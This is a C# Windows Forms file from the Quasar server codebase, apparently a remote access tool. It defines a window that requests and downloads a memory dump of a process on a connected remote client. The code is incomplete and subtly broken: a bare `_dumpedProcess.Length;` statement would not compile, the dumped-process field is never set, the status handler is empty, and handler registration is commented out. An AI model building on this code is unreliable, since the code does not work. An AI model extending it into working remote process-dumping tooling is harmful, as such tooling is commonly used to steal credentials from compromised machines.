using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Messages.Administration.TaskManager;
using Quasar.Common.Messages.Administration.FileManager;
using Quasar.Server.Controls;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using Quasar.Server.Models;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmMemoryDump: Form
    {
        /// <summary>
        /// The client which can be used for the memory dump.
        /// </summary>
        private readonly Client _connectClient;

        private readonly DoProcessDumpResponse _dumpedProcess;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly MemoryDumpHandler _dumpHandler;

        /// <summary>
        /// Holds the opened memory dump form for each dump.
        /// </summary>
        private static readonly Dictionary<DoProcessDumpResponse, KeyValuePair<Client, FrmMemoryDump>> OpenedForms = new Dictionary<DoProcessDumpResponse, KeyValuePair<Client, FrmMemoryDump>>();

        /// <summary>
        /// Creates a new memory dump form for the dump or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the memory dump form.</param>
        /// <param name="dump">The dump associated with this form</param>
        /// <returns>
        /// Returns a new memory dump form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmMemoryDump CreateNewOrGetExisting(Client client, DoProcessDumpResponse dump)
        {
            if (OpenedForms.ContainsKey(dump))
            {
                return OpenedForms[dump].Value;
            }
            FrmMemoryDump f = new FrmMemoryDump(client, dump);
            f.Disposed += (sender, args) => OpenedForms.Remove(dump);
            OpenedForms.Add(dump, new KeyValuePair<Client, FrmMemoryDump>(client, f));
            return f;
        }
        public FrmMemoryDump(Client client, DoProcessDumpResponse dump)
        {
            _connectClient = client;
            _dumpHandler = new MemoryDumpHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            progressDownload.Maximum = (int)dump.Length;
            progressDownload.Minimum = 0;
            DarkModeManager.ApplyDarkMode(this);
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _dumpHandler.ProgressChanged += SetStatusMessage;
            _dumpHandler.FileTransferUpdated += FileTransferUpdated;
            //MessageHandler.Register(_dumpHandler);
            // See MemoryDumpHandler for why thats commented out
        }

        private void UnregisterMessageHandler()
        {
            //MessageHandler.Unregister(_dumpHandler);
            // See MemoryDumpHandler for why thats commented out
            _dumpHandler.FileTransferUpdated -= FileTransferUpdated;
            _dumpHandler.ProgressChanged -= SetStatusMessage;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void SetStatusMessage(object sender, string message)
        {

        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            _dumpedProcess.Length;
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new FileTransferCancel { Id = 0, Reason = "User Requested" });
        }

        private void FrmMemoryDump_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Memory Dump", _connectClient) + $" of {_dumpedProcess.Pid} : {_dumpedProcess.ProcessName}";
        }
    }
}
